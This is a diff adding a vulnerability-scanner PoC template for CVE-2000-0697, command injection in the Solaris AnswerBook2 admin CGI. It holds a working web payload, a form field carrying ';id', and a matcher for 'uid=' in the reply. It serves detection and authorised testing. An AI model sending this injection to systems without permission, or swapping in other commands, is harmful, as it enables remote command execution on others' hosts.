@@ -1,0 +1,32 @@
+[info]
+author = "AVE"
+description = "检测 Solaris AnswerBook2 dwhttpd Web 服务器管理接口是否存在远程命令执行漏洞"
+id = "POC-AVE-2000-0547"
+name = "CVE-2000-0697 Solaris AnswerBook2 dwhttpd 远程命令执行 PoC"
+severity = "critical"
+tags = ["cve-2000-0697"]
+vuln_id = [
+    "CVE-2000-0697",
+    "AVE-2000-0547",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/ab2.cgi/Option"
+protocol = "http"
+
+[poc.requests.body]
+content = "logrotate=x%20%3B%20id"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
